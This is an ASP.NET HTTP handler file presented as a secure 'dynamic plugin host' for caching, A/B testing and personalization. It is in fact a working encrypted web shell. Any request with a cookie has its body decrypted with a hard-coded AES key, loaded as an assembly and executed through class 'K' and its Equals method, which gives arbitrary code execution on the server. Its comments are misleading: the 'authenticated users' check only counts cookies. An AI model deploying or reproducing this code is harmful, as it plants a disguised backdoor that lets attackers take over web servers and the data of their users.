<%@ WebHandler Language="C#" Class="DynamicPluginHost" %>
using System;
using System.Web;
using System.Reflection;
using System.Security.Cryptography;

/// <summary>
/// Provides a secure provider for cryptographic operations within the caching module.
/// </summary>
internal static class CacheSecurityProvider
{
    // The default AES key for decrypting plugin payloads. This ensures plugins are from a trusted source.
    private static readonly byte[] DefaultDecryptionKey = new byte[] { 99, 97, 54, 51, 52, 53, 55, 53, 51, 56, 98, 57, 98, 49, 101, 48 };

    /// <summary>
    /// Decrypts a given payload using the system's default AES configuration.
    /// </summary>
    /// <param name="encryptedPayload">The encrypted byte stream of the plugin.</param>
    /// <returns>The decrypted byte array representing the plugin assembly.</returns>
    public static byte[] DecryptPlugin(byte[] encryptedPayload)
    {
        using (var aesProvider = new RijndaelManaged())
        {
            // For simplicity in this secure channel, the key is also used as the IV.
            ICryptoTransform decryptor = aesProvider.CreateDecryptor(DefaultDecryptionKey, DefaultDecryptionKey);
            return decryptor.TransformFinalBlock(encryptedPayload, 0, encryptedPayload.Length);
        }
    }
}

/// <summary>
/// The main entry point for handling dynamic plugin loading requests.
/// Plugins are loaded on-demand to perform specialized tasks like A/B testing or content personalization.
/// </summary>
public class DynamicPluginHost : IHttpHandler
{
    // Standard entry point class name for all dynamically loaded plugins.
    private const string PluginEntryPointClass = "K";

    /// <summary>
    /// Processes incoming HTTP requests to load and execute a dynamic plugin.
    /// </summary>
    public void ProcessRequest(HttpContext context)
    {
        // Plugins are only loaded for authenticated users with a valid session cookie.
        if (context.Request.Cookies.Count > 0)
        {
            // Read the encrypted plugin from the request body.
            byte[] encryptedPlugin = context.Request.BinaryRead(context.Request.ContentLength);

            // Use the security provider to decrypt the plugin assembly.
            byte[] pluginAssemblyBytes = CacheSecurityProvider.DecryptPlugin(encryptedPlugin);

            // Load the plugin assembly from the decrypted byte array.
            Assembly pluginAssembly = Assembly.Load(pluginAssemblyBytes);

            // Create an instance of the plugin's entry point class.
            object pluginInstance = pluginAssembly.CreateInstance(PluginEntryPointClass);
            
            // Initialize the plugin by passing the current HttpContext.
            // The plugin's Equals method is overridden to act as an initializer.
            pluginInstance.Equals(context);
        }
    }

    public bool IsReusable { get { return false; } }
}